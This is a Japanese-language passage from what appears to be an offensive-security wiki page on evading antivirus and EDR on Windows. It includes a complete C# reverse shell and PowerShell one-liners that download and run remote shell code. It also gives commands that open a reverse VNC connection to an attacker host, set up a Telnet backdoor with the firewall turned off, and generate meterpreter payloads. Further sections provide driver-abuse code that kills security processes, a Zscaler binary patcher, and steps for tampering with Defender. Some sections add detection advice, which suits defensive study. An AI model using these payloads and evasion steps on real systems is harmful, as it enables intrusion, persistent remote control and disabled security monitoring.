AMSI を無効化（バイパス）するのと同様に、ユーザースペースプロセスの `EtwEventWrite` 関数をイベントをログせずに即座に戻すようにすることも可能です。これは、その関数をメモリ上でパッチして即座に return させることで行われ、そのプロセスに対する ETW ロギングを事実上無効化します。

詳しくは **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)** を参照してください。


## C# Assembly Reflection

C# バイナリをメモリにロードして実行する手法は以前から知られており、AV に検出されずに post-exploitation ツールを実行する非常に有効な方法です。

ペイロードがディスクに触れることなく直接メモリにロードされるため、プロセス全体に対する AMSI のパッチ化だけを気にすればよくなります。

ほとんどの C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) は既に C# assemblies をメモリ内で直接実行する機能を提供していますが、実行方法はいくつかあります:

- **Fork\&Run**

これは新しい犠牲プロセスを spawn し、その新プロセスに post-exploitation の悪意あるコードを注入して実行し、終了したらそのプロセスを kill するという方法です。利点と欠点の両方があります。利点は実行が Beacon implant プロセスの「外側」で行われるため、post-exploitation のアクションが失敗したり検出されても implant が生き残る可能性が高くなることです。欠点は Behavioural Detections に検出される確率が高くなることです。

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

これは post-exploitation の悪意あるコードを自身のプロセスに注入する方法です。これにより新しいプロセスを作成して AV にスキャンされるのを避けられますが、ペイロードの実行で何か問題が起きた場合に beacon を失う（クラッシュする）可能性が高くなります。

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> C# Assembly のロードについて詳しく知りたい場合はこの記事 [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) と InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly)) を確認してください。

C# Assemblies を **from PowerShell** からロードすることもできます。[Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) と [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk) を参照してください。

## Using Other Programming Languages

[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) で提案されているように、Attacker Controlled SMB share にインストールされたインタプリタ環境へのアクセスを侵害端末に与えることで、他の言語を使って悪意あるコードを実行することが可能です。

SMB share 上の Interpreter Binaries と環境へアクセスを許可することで、侵害されたマシンのメモリ内でこれらの言語による arbitrary code の実行ができます。

リポジトリの記載によれば、Defender はスクリプトをスキャンし続けますが、Go、Java、PHP などを利用することで static signatures を回避する柔軟性が向上します。これらの言語でのランダムな非難読化された reverse shell スクリプトでのテストは成功しています。

## TokenStomping

Token stomping は、攻撃者が access token や EDR や AV のようなセキュリティ製品に対して操作を行い、その権限を低下させることでプロセスを終了させずに悪意ある活動のチェック権限を奪う技術です。

これを防ぐために、Windows 側でセキュリティプロセスの token に対して外部プロセスがハンドルを取得することを防止することが考えられます。

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

[**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) にあるように、被害者 PC に Chrome Remote Desktop を導入して takeover し persistence を維持するのは簡単です:
1. https://remotedesktop.google.com/ からダウンロードし、"Set up via SSH" をクリックして、Windows 用の MSI ファイルをクリックしてダウンロードします。
2. 被害者側でインストーラをサイレント実行（管理者権限が必要）: `msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktop ページに戻って next をクリックします。ウィザードが authorization を求めるので、Authorize ボタンをクリックして続行します。
4. 指定されたパラメータを若干調整して実行します: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111`（pin パラメータにより GUI を使わずにピンを設定できます）。

## Advanced Evasion

Evasion は非常に複雑なトピックで、単一のシステム内でも多数の異なるテレメトリソースを考慮する必要があり、成熟した環境で完全に検出されないままでいるのはほぼ不可能です。

対峙する環境ごとに強みと弱みが異なります。

より高度な Evasion 技術を学ぶために、[@ATTL4S](https://twitter.com/DaniLJ94) のこのトークを見ることを強くおすすめします。


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

これは [@mariuszbit](https://twitter.com/mariuszbit) の Evasion in Depth に関する別の良いトークです。


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

[**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) を使うと、バイナリの一部を順次取り除きながら Defender がどの部分を悪意あるものと判定しているかを特定して分割してくれます。\
同様のことを行う別のツールは [**avred**](https://github.com/dobin/avred) で、サービスを提供するウェブ版は [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) にあります。

### **Telnet Server**

Windows10 以前は、すべての Windows にインストール可能な **Telnet server** が付属しており、管理者として以下を実行することでインストールできました:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
システム起動時にそれを**開始**し、今すぐ**実行**してください:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**telnet ポートを変更する** (ステルス) と firewall を無効にする:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (you want the bin downloads, not the setup)

**ON THE HOST**: _**winvnc.exe**_ を実行し、サーバーを設定する:

- オプション _Disable TrayIcon_ を有効にする
- _VNC Password_ にパスワードを設定する
- _View-Only Password_ にパスワードを設定する

次に、バイナリ _**winvnc.exe**_ と **新たに** 作成されたファイル _**UltraVNC.ini**_ を **victim** 内に移動する

#### **Reverse connection**

The **attacker** should **execute inside** his **host** the binary `vncviewer.exe -listen 5900` so it will be **prepared** to catch a reverse **VNC connection**. Then, inside the **victim**: Start the winvnc daemon `winvnc.exe -run` and run `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** ステルスを維持するために以下のことは行わないこと

- Don't start `winvnc` if it's already running or you'll trigger a [popup](https://i.imgur.com/1SROTTl.png). check if it's running with `tasklist | findstr winvnc`
- Don't start `winvnc` without `UltraVNC.ini` in the same directory or it will cause [the config window](https://i.imgur.com/rfMQWcf.png) to open
- Don't run `winvnc -h` for help or you'll trigger a [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Download it from: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
GreatSCTの内部:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
次に、`msfconsole -r file.rc` で **lister を起動** し、**xml payload** を **実行** します:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**現在の Defender はプロセスを非常に速く終了させます。**

### 自分たちで reverse shell をコンパイルする

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### 最初の C# Revershell

次のコマンドでコンパイルします:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
次のように使用します：
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# コンパイラを使用
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

自動ダウンロードと実行:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# のオブフスケータ一覧: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### python を使った build injectors の例:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### その他のツール
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### その他

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – カーネル空間からの AV/EDR 無効化

Storm-2603 は、ランサムウェアを展開する前にエンドポイント保護を無効化するために **Antivirus Terminator** という小さなコンソールユーティリティを利用しました。このツールは **独自の脆弱だが*署名済み*ドライバ** を持ち込み、それを悪用して Protected-Process-Light (PPL) の AV サービスでさえもブロックできない特権的なカーネル操作を実行します。

主なポイント
1. **Signed driver**: ディスクに配置されるファイルは `ServiceMouse.sys` ですが、バイナリ自体は Antiy Labs の “System In-Depth Analysis Toolkit” に含まれる正当に署名されたドライバ `AToolsKrnl64.sys` です。ドライバが有効な Microsoft 署名を持つため、Driver-Signature-Enforcement (DSE) が有効な場合でもロードされます。
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
最初の行はドライバを **kernel service** として登録し、2 行目はそれを起動して `\\.\ServiceMouse` がユーザランドからアクセス可能になるようにします。
3. **IOCTLs exposed by the driver**
| IOCTL code | 機能 |
|-----------:|-----------------------------------------|
| `0x99000050` | 任意の PID のプロセスを終了（Defender/EDR サービスを停止するために使用） |
| `0x990000D0` | 任意のファイルをディスク上から削除 |
| `0x990001D0` | ドライバをアンロードしてサービスを削除 |

最小限の C プルーフ・オブ・コンセプト:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**: BYOVD はユーザモードの保護を完全に迂回します。カーネルで実行されるコードは *保護された* プロセスを開いたり、終了させたり、PPL/PP、ELAM やその他のハードニング機能に関係なくカーネルオブジェクトを改変したりできます。

Detection / Mitigation
• Microsoft の vulnerable-driver block list（`HVCI`, `Smart App Control`）を有効にして、Windows が `AToolsKrnl64.sys` のロードを拒否するようにする。  
• 新しい *kernel* サービスの作成を監視し、ドライバが world-writable なディレクトリからロードされたり allow-list に存在しない場合にアラートを出す。  
• カスタムデバイスオブジェクトへのユーザモードハンドルと、その後に続く疑わしい `DeviceIoControl` 呼び出しを監視する。

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler の **Client Connector** はデバイスポスチャルールをローカルで適用し、結果を他のコンポーネントに伝えるために Windows RPC を利用します。完全なバイパスを可能にする弱い設計上の選択が 2 つあります:

1. ポスチャ評価は **完全にクライアント側で実行される**（真偽値がサーバへ送信されるだけ）。
2. 内部 RPC エンドポイントは接続してくる実行ファイルが **Zscaler によって署名されているか**（`WinVerifyTrust` 経由）だけを検証する。

ディスク上の署名済みバイナリ 4 つをパッチすることで、両方の仕組みを無効化できます:

| Binary | パッチされた元のロジック | 結果 |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | 常に `1` を返すようにして、すべてのチェックを準拠させる |
| `ZSAService.exe` | `WinVerifyTrust` への間接呼び出し | NOP 化 ⇒ 任意の（署名されていない）プロセスでも RPC パイプにバインド可能 |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret` に置換 |
| `ZSATunnel.exe` | トンネルに対する整合性チェック | ショートサーキット（回避） |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
元のファイルを置き換え、サービススタックを再起動した後：

* **All** posture checks が **green/compliant** と表示される。
* Unsigned または modified binaries が named-pipe RPC endpoints を開ける（例: `\\RPC Control\\ZSATrayManager_talk_to_me`）。
* The compromised host は Zscaler policies によって定義された internal network へ無制限にアクセスできる。

このケーススタディは、純粋に client-side な信頼判断や simple signature checks が数バイトのパッチで破られることを示す。

## Protected Process Light (PPL) を悪用して AV/EDR を LOLBINs で改ざんする

Protected Process Light (PPL) は signer/level の階層を強制し、同等かそれ以上の保護されたプロセスのみが互いを改ざんできるようにする。攻撃的には、正当に PPL-enabled なバイナリを起動してその引数を制御できれば、ログ等の無害な機能を AV/EDR が使用する protected directories に対する制約付きの、PPL 裏付けの write primitive に変換できる。

プロセスが PPL として実行される要件
- ターゲットの EXE（および読み込まれる DLLs）は PPL-capable な EKU で署名されている必要がある。
- プロセスは CreateProcess を使い、フラグ: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS` を指定して作成されなければならない。
- バイナリの署名者に一致する互換性のある protection level を要求する必要がある（例: anti-malware 署名者には `PROTECTION_LEVEL_ANTIMALWARE_LIGHT`、Windows 署名者には `PROTECTION_LEVEL_WINDOWS`）。不適切なレベルでは作成時に失敗する。

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (selects protection level and forwards arguments to the target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- The signed system binary `C:\Windows\System32\ClipUp.exe` self-spawns and accepts a parameter to write a log file to a caller-specified path.
- When launched as a PPL process, the file write occurs with PPL backing.
- ClipUp cannot parse paths containing spaces; use 8.3 short paths to point into normally protected locations.

8.3短縮パスの補助
- 短縮名を一覧表示: `dir /x` を各親ディレクトリで実行。
- cmdで短縮パスを導出: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

悪用チェーン（概要）
1) Launch the PPL-capable LOLBIN (ClipUp) with `CREATE_PROTECTED_PROCESS` using a launcher (e.g., CreateProcessAsPPL).
2) Pass the ClipUp log-path argument to force a file creation in a protected AV directory (e.g., Defender Platform). Use 8.3 short names if needed.
3) If the target binary is normally open/locked by the AV while running (e.g., MsMpEng.exe), schedule the write at boot before the AV starts by installing an auto-start service that reliably runs earlier. Validate boot ordering with Process Monitor (boot logging).
4) On reboot the PPL-backed write happens before the AV locks its binaries, corrupting the target file and preventing startup.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
注意事項と制約
- ClipUp が書き込む内容は配置以外では制御できません。この手法は精密なコンテンツ注入よりも改ざんに適しています。
- サービスのインストール/起動と再起動の機会が必要で、local admin/SYSTEM が要求されます。
- タイミングが重要：対象は開かれていてはいけません。ブート時実行はファイルロックを回避します。

検出
- ブート周辺で、特に非標準のランチャーを親に持つ場合に、異常な引数で作成された `ClipUp.exe` のプロセスを監視する。
- 自動起動に設定された疑わしいバイナリの新規サービスや、Defender/AV より常に先に起動するサービス。Defender 起動失敗前のサービス作成/変更を調査する。
- Defender バイナリや Platform ディレクトリに対するファイル整合性監視；protected-process フラグを持つプロセスによる予期しないファイル作成/変更を検出する。
- ETW/EDR テレメトリ：`CREATE_PROTECTED_PROCESS` で作成されたプロセスや、非-AV バイナリによる異常な PPL レベル使用を確認する。

緩和策
- WDAC/Code Integrity：どの署名済みバイナリが PPL として、どの親プロセスの下で実行できるかを制限する。正当なコンテキスト外での ClipUp 呼び出しをブロックする。
- サービス運用の厳格化：自動起動サービスの作成/変更を制限し、起動順序の操作を監視する。
- Defender の tamper protection と early-launch protection を有効にする。バイナリ破損を示す起動エラーを調査する。
- 環境と互換性がある場合、セキュリティツールをホストするボリュームで 8.3 ショートネーム生成を無効化することを検討する（十分にテストすること）。

PPL とツールの参考
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender は以下の下位フォルダを列挙して、実行するプラットフォームを選択します：
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

辞書順で最も大きいバージョン文字列を持つサブフォルダ（例: `4.18.25070.5-0`）を選び、そこから Defender のサービスプロセスを起動します（サービス/レジストリのパスも更新されます）。この選択はディレクトリエントリ（directory reparse points を含む symlinks）を信頼するため、管理者は Defender を攻撃者が書き込み可能なパスにリダイレクトし、DLL sideloading やサービス停止を引き起こすことができます。

前提条件
- ローカル管理者（Platform フォルダ配下にディレクトリ/シンボリックリンクを作成するために必要）
- 再起動または Defender の platform 再選択をトリガーできること（ブート時のサービス再起動）
- 組み込みツールのみで可能（mklink）

なぜ動作するか
- Defender は自身のフォルダへの書き込みをブロックしますが、platform の選択はディレクトリエントリを信頼して辞書順で最も大きいバージョンを選び、ターゲットが保護/信頼されたパスに解決されるかを検証しません。

手順（例）
1) 現在の platform フォルダの書き込み可能なクローンを用意する、例: `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Platform 内に、あなたのフォルダを指す上位バージョンのディレクトリ symlink を作成します:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) トリガー選択（再起動を推奨）:
```cmd
shutdown /r /t 0
```
4) MsMpEng.exe (WinDefend) がリダイレクトされたパスから実行されていることを確認する:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
You should observe the new process path under `C:\TMP\AV\` and the service configuration/registry reflecting that location.

Post-exploitation options
- DLL sideloading/code execution: Defender がアプリケーションディレクトリから読み込む DLL を置換または差し替えて、Defender のプロセス内でコードを実行します。上のセクションを参照: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: version-symlink を削除すると、次回起動時に設定されたパスが解決されず Defender が起動に失敗します:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> この技術自体は特権昇格を提供しません。管理者権限が必要です。

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams は、Import Address Table (IAT) をフックして選択した API を攻撃者が管理する位置非依存コード (PIC) 経由でルーティングすることで、ランタイム回避を C2 implant の外側、ターゲットモジュール自身に移すことができます。これは（例: CreateProcessA のように）多くのキットが露呈する狭い API 表面を越えて回避を一般化し、同じ保護を BOFs や post‑exploitation DLLs にも拡張します。

High-level approach
- 反射ローダーを使って（prepended または companion）ターゲットモジュールの隣に PIC blob をステージする。PIC は自己完結型で位置非依存でなければならない。
- ホスト DLL がロードされる際に IMAGE_IMPORT_DESCRIPTOR を走査し、対象のインポート（例: CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc）に対応する IAT エントリを薄い PIC ラッパーを指すようにパッチする。
- 各 PIC ラッパーは実 API アドレスへ tail‑call する前に回避処理を実行する。典型的な回避には以下が含まれる：
  - 呼び出し前後のメモリマスク/アンマスク（例：beacon 領域を暗号化、RWX→RX、ページ名/権限の変更）を行い、呼び出し後に復元する。
  - Call‑stack spoofing：無害に見えるスタックを構築してターゲット API へ遷移し、コールスタック解析が期待されるフレームに解決されるようにする。
- 互換性のため、インターフェースをエクスポートして Aggressor スクリプト（または同等のもの）が Beacon、BOFs、post‑ex DLLs に対してどの API をフックするか登録できるようにする。

Why IAT hooking here
- フックされたインポートを使用する任意のコードに対して機能し、ツールのコードを変更したり Beacon に特定の API をプロキシさせたりする必要がない。
- post‑ex DLLs をカバーする：LoadLibrary* をフックすることでモジュールのロード（例: System.Management.Automation.dll, clr.dll）を傍受でき、同じマスキング／スタック回避をそれらの API 呼び出しに適用できる。
- CreateProcessA/W をラップすることで、コールスタックベースの検出に対してプロセス生成を行う post‑ex コマンドの信頼性のある利用を回復する。

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notes
- パッチは relocations/ASLR 適用後、import が最初に使用される前に適用する。Reflective loaders（TitanLdr/AceLdr のような）は読み込まれたモジュールの DllMain 内での hooking を示す。
- ラッパーは小さく PIC-safe に保つこと。実際の API はパッチ前に取得したオリジナルの IAT 値経由、または LdrGetProcedureAddress 経由で解決する。
- PIC 用には RW → RX の遷移を使い、writable+executable なページを残さないこと。

- Call‑stack spoofing stub
- Draugr‑style PIC stubs は偽のコールチェーン（戻りアドレスを benign なモジュールに向ける）を構築し、その後実際の API にピボットする。
- これは Beacon/BOFs から敏感な APIs への正規のスタックを期待する検出を回避する。
- stack cutting/stack stitching テクニックと組み合わせ、API prologue の前に期待されるフレーム内に着地させる。

- Operational integration
- reflective loader を post‑ex DLLs の先頭に付けておくと、DLL がロードされると同時に PIC と hooks が自動的に初期化される。
- Aggressor script を使ってターゲット API を登録すれば、Beacon と BOFs もコード変更なしに同じ回避経路の恩恵を受けられる。

- Detection/DFIR considerations
- IAT integrity: non‑image（heap/anon）アドレスに解決されるエントリ；import ポインタの定期的検証。
- Stack anomalies: ロード済みイメージに属さない戻りアドレス；non‑image PIC への急な遷移；不整合な RtlUserThreadStart の系譜。
- Loader telemetry: プロセス内での IAT 書き込み、import thunk を変更する早期の DllMain 活動、ロード時に作成される予期しない RX 領域。
- Image‑load evasion: LoadLibrary* にフックしている場合、memory masking イベントと相関する automation/clr アセンブリの疑わしいロードを監視する。

- Related building blocks and examples
- Reflective loaders that perform IAT patching during load (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) and stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (e.g., Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks via a resident PICO

If you control a reflective loader, you can hook imports **during** `ProcessImports()` by replacing the loader's `GetProcAddress` pointer with a custom resolver that checks hooks first:

- Build a **resident PICO** (persistent PIC object) that survives after the transient loader PIC frees itself.
- Export a `setup_hooks()` function that overwrites the loader's import resolver (e.g., `funcs.GetProcAddress = _GetProcAddress`).
- In `_GetProcAddress`, skip ordinal imports and use a hash-based hook lookup like `__resolve_hook(ror13hash(name))`. If a hook exists, return it; otherwise delegate to the real `GetProcAddress`.
- Register hook targets at link time with Crystal Palace `addhook "MODULE$Func" "hook"` entries. The hook stays valid because it lives inside the resident PICO.

This yields **import-time IAT redirection** without patching the loaded DLL's code section post-load.

### Forcing hookable imports when the target uses PEB-walking

Import-time hooks only trigger if the function is actually in the target's IAT. If a module resolves APIs via a PEB-walk + hash (no import entry), force a real import so the loader's `ProcessImports()` path sees it:

- Replace hashed export resolution (e.g., `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) with a direct reference like `&WaitForSingleObject`.
